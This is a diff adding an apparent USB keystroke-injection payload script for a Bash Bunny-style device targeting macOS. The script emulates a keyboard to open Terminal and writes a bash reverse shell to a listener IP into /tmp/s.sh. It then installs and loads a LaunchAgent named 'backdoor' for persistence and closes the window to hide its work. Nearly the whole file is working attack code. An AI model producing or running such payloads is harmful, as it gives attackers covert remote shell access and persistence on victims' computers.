@@ -1,0 +1,68 @@
+#!/bin/bash
+#
+# Title:         RAZ_MacReverseShell
+# Author:        RalphyZ
+# Version:       1.1
+# Target:        Mac OSX
+# Dependencies:  None
+#
+# Description:   Starts a terminal window on a Mac,then creates a bash reverse
+#                shell inside a script, /tmp/s.sh.  It then adds the script to the
+#                Launch Agent - establishing persistence - running at a 
+#                user-defined interval
+#
+# Colors:
+# Green (blinking)..........Working
+# White.....................Completed without error
+
+# Edit this to point to the  NetCat Listener
+LISTENER_IP="192.168.1.100"
+LISTENER_PORT="4444"
+
+# How often (in minutes) should this run from the Launch Agent
+FREQUENCY="60"
+
+#----Proceed with Caution------------------------------------------------------
+
+# Green blinking LED
+LED G 100
+
+# Human Interface Device
+ATTACKMODE HID
+
+# Emulate the Ducky - QUACK!
+QUACK DEFAULT_DELAY 300
+
+# Start the Mac Terminal
+QUACK COMMAND SPACE
+QUACK STRING terminal
+QUACK DELAY 500
+QUACK ENTER
+
+# Give the terminal window a second to pop up
+QUACK DELAY 1000
+
+# Bash Reverse Shell into a script 's.sh'
+QUACK STRING echo \"bash -i \>\& /dev/tcp/${LISTENER_IP}/${LISTENER_PORT} 0\>\&1\" \> /tmp/s.sh
+QUACK ENTER
+QUACK DELAY 500
+
+# Change file permissions to allow execution
+QUACK STRING chmod +x /tmp/s.sh
+QUACK ENTER
+QUACK DELAY 500
+
+# Add to the Launch Agents
+QUACK STRING printf \"\<plist version=\\\"1.0\\\"\>\\n    \<dict\>\\n    \<key\>Label\</key\>\\n        \<string\>com.ralphyz.backdoor\</string\>\\n    \<key\>ProgramArguments\</key\>\\n    \<array\>\\n        \<string\>/bin/sh\</string\>\\n        \<string\>/tmp/s.sh\</string\>\\n    \</array\>\\n    \<key\>RunAtLoad\</key\>\\n        \<true/\>\\n    \<key\>StartInterval\</key\>\\n        \<integer\>${FREQUENCY}\</integer\>\\n    \<key\>AbandonProcessGroup\</key\>\\n        \<true/\>\\n    \</dict\>\\n\</plist\>\" \> \~/Library/LaunchAgents/com.ralphyz.backdoor.plist
+QUACK ENTER
+QUACK DELAY 500
+
+# Load the new Launch Agent - establishing persistence - and clear the terminal
+QUACK STRING launchctl load com.ralphyz.backdoor.plist \&\& clear
+QUACK ENTER
+
+# Close the Terminal Window
+QUACK COMMAND q
+
+# White LED for finished
+LED R G B
